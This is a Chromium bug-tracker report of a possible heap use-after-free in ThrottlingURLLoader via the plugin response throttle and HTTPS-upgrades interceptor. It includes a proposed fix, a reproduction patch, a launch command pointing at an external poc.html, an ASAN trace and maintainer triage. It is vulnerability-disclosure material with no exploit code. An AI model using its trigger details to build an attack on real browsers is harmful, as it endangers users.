# Security: possible heap UaF in ThrottlingURLLoader+HttpsUpgradesInterceptor+MaybeCreateLoaderForResponse

| Field | Value |
|-------|-------|
| **Issue ID** | [349342289](https://issues.chromium.org/issues/349342289) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Loader>WebPackaging, Internals>Network>SSL>HttpsUpgrades, UI>Browser>Navigation |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ha...@gmail.com |
| **Assignee** | hi...@chromium.org |
| **Created** | 2024-06-25 |
| **Bounty** | $8,000.00 |

## Description

The cause of this vulnerability is the same as https://issues.chromium.org/issues/40068602. I don't have POC and ASAN proofs at the moment because there are problems with my current test, but I believe it should exist. I should construct ASAN to prove the vulnerability later.

void PluginResponseInterceptorURLLoaderThrottle::WillProcessResponse(
    const GURL& response_url,
    network::mojom::URLResponseHead* response_head,
    bool* defer) {
  DCHECK_CURRENTLY_ON(content::BrowserThread::UI);

  content::WebContents* web_contents =
      content::WebContents::FromFrameTreeNodeId(frame_tree_node_id_);
  if (!web_contents)
    return;

  if (content::download_utils::MustDownload(
          web_contents->GetBrowserContext(), response_url,
          response_head->headers.get(), response_head->mime_type)) {
    return;
  }

  std::string extension_id = PluginUtils::GetExtensionIdForMimeType(
      web_contents->GetBrowserContext(), response_head->mime_type);

  if (extension_id.empty())
    return;

  // TODO(crbug.com/40180674): Support prerendering of MimeHandlerViews.
  if (web_contents->IsPrerenderedFrame(frame_tree_node_id_)) {
    delegate_->CancelWithError(
        net::Error::ERR_BLOCKED_BY_CLIENT,
        "MimeHandler prerendering support not implemented.");
    return;
  }




I believe the following fix completely resolves the root cause of the vulnerability

@@ -654,7 +654,11 @@ void ThrottlingURLLoader::OnReceiveResponse(
       base::Time start = base::Time::Now();
       throttle->BeforeWillProcessResponse(response_url_, *response_head,
                                           &has_pending_restart);
-      RecordExecutionTimeHistogram("BeforeWillProcessResponse", start);
+     
+      if (!weak_ptr)
+         return;
+
+       RecordExecutionTimeHistogram("BeforeWillProcessResponse", start);
       if (!HandleThrottleResult(throttle)) {
         return;
       }


bisect
https://chromium-review.googlesource.com/c/chromium/src/+/4104103

## Attachments

- [apply.diff](attachments/apply.diff) (text/x-diff, 633 B)

## Timeline

### el...@chromium.org (2024-06-25)

Security shepherd here! Thanks for the report. I'm going to provisionally mark this as Pri-1 similar to [issue 40068602](https://issues.chromium.org/issues/40068602) and assign this to the owner of that bug, but please do follow up with the asan stack trace if/when you get it.

### ho...@chromium.org (2024-06-26)

[hiroshige@chromium.org](mailto:hiroshige@chromium.org)

Could you please handle this?

I think you recently refactored ThrottlingURLLoader.

Thank you.

### pe...@google.com (2024-06-26)

Setting milestone because of s0/s1 severity.

### el...@chromium.org (2024-06-26)

Copying the OS tags from [issue 40068602](https://issues.chromium.org/issues/40068602).

### ha...@gmail.com (2024-06-28)

reproduce step

1.patch apply.diff

```
@@ -632,7 +632,7 @@ bool HttpsUpgradesInterceptor::MaybeCreateLoaderForRes
   }
 
   auto* tab_helper = HttpsOnlyModeTabHelper::FromWebContents(web_contents);
-  if (!tab_helper || !tab_helper->is_navigation_upgraded()) {
+  if (!tab_helper || tab_helper->is_navigation_upgraded()) {
     return false;
   }

```

2.out/Default/Chromium.app/Contents/MacOS/Chromium <http://54e3-2400-d802-33c3-cd00-ed3c-b7d2-fb5d-b66.ngrok-free.app/poc.html>

```
=================================================================
==4182==ERROR: AddressSanitizer: heap-use-after-free on address 0x61800024648c at pc 0x00013589573c bp 0x00016f42c6f0 sp 0x00016f42c6e8
READ of size 1 at 0x61800024648c thread T0
==4182==WARNING: invalid path to external symbolizer!
==4182==WARNING: Failed to use and restart external symbolizer!
    #0 0x135895738 in blink::ThrottlingURLLoader::OnReceiveResponse(mojo::StructPtr<network::mojom::URLResponseHead>, mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>, std::__Cr::optional<mojo_base::BigBuffer>)+0x7f8 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1e9738)
    #1 0x135a18324 in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient*, mojo::Message*)+0x59c (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x36c324)
    #2 0x1020e6cb0 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x7ac (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x22cb0)
    #3 0x1020fac0c in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x36c0c)
    #4 0x1020eb068 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x154 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x27068)
    #5 0x102106554 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*)+0x77c (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x42554)
    #6 0x102104bac in mojo::internal::MultiplexRouter::Accept(mojo::Message*)+0x418 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x40bac)
    #7 0x1020fac0c in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x36c0c)
    #8 0x1020d52f4 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x378 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x112f4)
    #9 0x1020d6bd0 in mojo::Connector::ReadAllAvailableMessages()+0x23c (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x12bd0)
    #10 0x1020d66a8 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int)+0xe8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x126a8)
    #11 0x1020d885c in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int)+0x1b8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x1485c)
    #12 0x1020d8278 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x154 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x14278)
    #13 0x1020d804c in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x1404c)
    #14 0x102061400 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x164 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x19400)
    #15 0x102060e08 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x3a4 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x18e08)
    #16 0x102061d28 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>)+0x198 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x19d28)
    #17 0x1030cb9fc in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x34c (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1879fc)
    #18 0x10313582c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x7f8 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f182c)
    #19 0x103134c98 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f0c98)
    #20 0x10327c674 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c4 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x338674)
    #21 0x10326af90 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x326f90)
    #22 0x10327ac18 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x336c18)
    #23 0x1819fe4d4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64+0x7e4d4)
    #24 0x8f588001819fe468  (<unknown module>)
    #25 0x80060001819fe1d8  (<unknown module>)
    #26 0x71598001819fcdc4  (<unknown module>)
    #27 0x1f658001819fc430  (<unknown module>)
    #28 0xb84380018c1a0198  (<unknown module>)
    #29 0x2c5400018c19ffd4  (<unknown module>)
    #30 0x294080018c19fd2c  (<unknown module>)
    #31 0xd85f00018525bd64  (<unknown module>)
    #32 0xf14f800185a51804  (<unknown module>)
    #33 0x400f80011adec554  (<unknown module>)
    #34 0x10326af90 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x326f90)
    #35 0x11adec218 in -[BrowserCrApplication nextEventMatchingMask:untilDate:inMode:dequeue:]+0x1a4 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x2e64218)
    #36 0x18524f098 in -[NSApplication run]+0x1d8 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64+0x2d098)
    #37 0x890000010327e590  (<unknown module>)
    #38 0x103279834 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x28c (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x335834)
    #39 0x103136ddc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x3cc (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f2ddc)
    #40 0x103060870 in base::RunLoop::Run(base::Location const&)+0x438 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x11c870)
    #41 0x10e1e20f4 in content::BrowserMainLoop::RunMainMessageLoop()+0x178 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0xd420f4)
    #42 0x10e1e8400 in content::BrowserMainRunnerImpl::Run()+0x30 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0xd48400)
    #43 0x10e1dab70 in content::BrowserMain(content::MainFunctionParams)+0x1f8 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0xd3ab70)
    #44 0x1105787e4 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*)+0x1b0 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x30d87e4)
    #45 0x11057b178 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool)+0x8e4 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x30db178)
    #46 0x11057a688 in content::ContentMainRunnerImpl::Run()+0x454 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x30da688)
    #47 0x110576a2c in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x478 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x30d6a2c)
    #48 0x110577370 in content::ContentMain(content::ContentMainParams)+0x190 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x30d7370)
    #49 0x117f92f30 in ChromeMain+0x374 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0xaf30)
    #50 0x1009d0b80 in main+0x1f8 (/Users/test/chromium/src/out/Default/Chromium.app/Contents/MacOS/Chromium:arm64+0x100000b80)
    #51 0x1815960dc  (<unknown module>)
    #52 0x8a34fffffffffffc  (<unknown module>)

0x61800024648c is located 12 bytes inside of 872-byte region [0x618000246480,0x6180002467e8)
freed by thread T0 here:
    #0 0x101588524 in __sanitizer_finish_switch_fiber+0xa24 (/Users/test/chromium/src/out/Default/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x60524)
    #1 0x10ea85e44 in content::NavigationURLLoaderImpl::MaybeCreateLoaderForResponse(network::URLLoaderCompletionStatus const&, mojo::StructPtr<network::mojom::URLResponseHead>*)+0x530 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e5e44)
    #2 0x10ea890c8 in content::NavigationURLLoaderImpl::OnComplete(network::URLLoaderCompletionStatus const&)+0x154 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e90c8)
    #3 0x1358976e8 in blink::ThrottlingURLLoader::CancelWithExtendedError(int, int, std::__Cr::basic_string_view<char, std::__Cr::char_traits<char>>)+0x234 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1eb6e8)
    #4 0x13589edec in blink::ThrottlingURLLoader::ForwardingThrottleDelegate::CancelWithExtendedError(int, int, std::__Cr::basic_string_view<char, std::__Cr::char_traits<char>>)+0x128 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1f2dec)
    #5 0x11be26e50 in PluginResponseInterceptorURLLoaderThrottle::WillProcessResponse(GURL const&, network::mojom::URLResponseHead*, bool*)+0x97c (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x3e9ee50)
    #6 0x135895614 in blink::ThrottlingURLLoader::OnReceiveResponse(mojo::StructPtr<network::mojom::URLResponseHead>, mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>, std::__Cr::optional<mojo_base::BigBuffer>)+0x6d4 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1e9614)
    #7 0x135a18324 in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient*, mojo::Message*)+0x59c (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x36c324)
    #8 0x1020e6cb0 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x7ac (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x22cb0)
    #9 0x1020fac0c in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x36c0c)
    #10 0x1020eb068 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x154 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x27068)
    #11 0x102106554 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*)+0x77c (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x42554)
    #12 0x102104bac in mojo::internal::MultiplexRouter::Accept(mojo::Message*)+0x418 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x40bac)
    #13 0x1020fac0c in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x36c0c)
    #14 0x1020d52f4 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x378 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x112f4)
    #15 0x1020d6bd0 in mojo::Connector::ReadAllAvailableMessages()+0x23c (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x12bd0)
    #16 0x1020d66a8 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int)+0xe8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x126a8)
    #17 0x1020d885c in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int)+0x1b8 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x1485c)
    #18 0x1020d8278 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x154 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x14278)
    #19 0x1020d804c in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0 (/Users/test/chromium/src/out/Default/libmojo_public_cpp_bindings.dylib:arm64+0x1404c)
    #20 0x102061400 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x164 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x19400)
    #21 0x102060e08 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x3a4 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x18e08)
    #22 0x102061d28 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>)+0x198 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x19d28)
    #23 0x1030cb9fc in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x34c (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1879fc)
    #24 0x10313582c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x7f8 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f182c)
    #25 0x103134c98 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f0c98)
    #26 0x10327c674 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c4 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x338674)
    #27 0x10326af90 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x326f90)
    #28 0x10327ac18 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xec (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x336c18)
    #29 0x1819fe4d4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64+0x7e4d4)

previously allocated by thread T0 here:
    #0 0x10158811c in __sanitizer_finish_switch_fiber+0x61c (/Users/test/chromium/src/out/Default/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x6011c)
    #1 0x13588e9cc in blink::ThrottlingURLLoader::CreateLoaderAndStart(scoped_refptr<network::SharedURLLoaderFactory>, std::__Cr::vector<std::__Cr::unique_ptr<blink::URLLoaderThrottle, std::__Cr::default_delete<blink::URLLoaderThrottle>>, std::__Cr::allocator<std::__Cr::unique_ptr<blink::URLLoaderThrottle, std::__Cr::default_delete<blink::URLLoaderThrottle>>>>, int, unsigned int, network::ResourceRequest*, network::mojom::URLLoaderClient*, net::NetworkTrafficAnnotationTag const&, scoped_refptr<base::SequencedTaskRunner>, std::__Cr::optional<std::__Cr::vector<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, std::__Cr::allocator<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>>>>, blink::ThrottlingURLLoader::ClientReceiverDelegate*)+0x124 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1e29cc)
    #2 0x10ea7df8c in content::NavigationURLLoaderImpl::CreateThrottlingLoaderAndStart(scoped_refptr<network::SharedURLLoaderFactory>, std::__Cr::vector<std::__Cr::unique_ptr<blink::URLLoaderThrottle, std::__Cr::default_delete<blink::URLLoaderThrottle>>, std::__Cr::allocator<std::__Cr::unique_ptr<blink::URLLoaderThrottle, std::__Cr::default_delete<blink::URLLoaderThrottle>>>>)+0x3f8 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15ddf8c)
    #3 0x10ea80d88 in content::NavigationURLLoaderImpl::StartNonInterceptedRequest(content::ResponseHeadUpdateParams)+0x378 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e0d88)
    #4 0x10ea80748 in content::NavigationURLLoaderImpl::MaybeStartLoader(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)+0x7d4 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e0748)
    #5 0x10ea8fbbc in void base::internal::DecayedFunctorTraits<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>::Invoke<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>>(void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long&&, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x18c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15efbbc)
    #6 0x10ea8f988 in base::internal::Invoker<base::internal::FunctorTraits<void (content::NavigationURLLoaderImpl::*&&)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>, base::internal::BindState<true, true, false, void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>, unsigned long>, void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>::RunOnce(base::internal::BindStateBase*, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x11c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15ef988)
    #7 0x10ea96920 in base::internal::Invoker<base::internal::FunctorTraits<content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)::'lambda'(base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)&&, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>&&>, base::internal::BindState<false, false, false, content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)::'lambda'(base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>), base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>>, void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>::RunOnce(base::internal::BindStateBase*, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>&&)+0x548 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15f6920)
    #8 0x11a188278 in base::OnceCallback<void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>::Run(base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>) &&+0x160 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x2200278)
    #9 0x11b4e5c64 in HttpsUpgradesInterceptor::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>)+0x208 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x355dc64)
    #10 0x10ea96284 in content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)+0x1a0 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15f6284)
    #11 0x10ea80704 in content::NavigationURLLoaderImpl::MaybeStartLoader(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)+0x790 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e0704)
    #12 0x10ea8fbbc in void base::internal::DecayedFunctorTraits<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>::Invoke<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>>(void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long&&, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x18c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15efbbc)
